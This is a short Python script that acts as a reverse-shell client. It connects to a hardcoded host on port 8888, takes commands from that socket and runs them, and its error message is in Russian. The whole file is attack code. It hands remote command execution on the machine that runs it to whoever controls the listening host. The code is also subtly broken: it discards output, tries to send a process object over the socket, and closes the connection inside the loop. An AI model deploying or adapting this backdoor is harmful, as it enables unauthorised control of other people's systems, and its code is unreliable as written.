from asyncio.subprocess import DEVNULL
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.1.76', 8888))

while True:
    command = s.recv(4096).decode()

    if command.lower() == 'exit':
        s.close()
        break
    else:
        try:
            output = subprocess.run(command, stdout=DEVNULL, timeout=10)
            s.send(output)
            s.close()
        except Exception as err:
            s.send('Ошибка выполнения команды...'.encode())
s.close()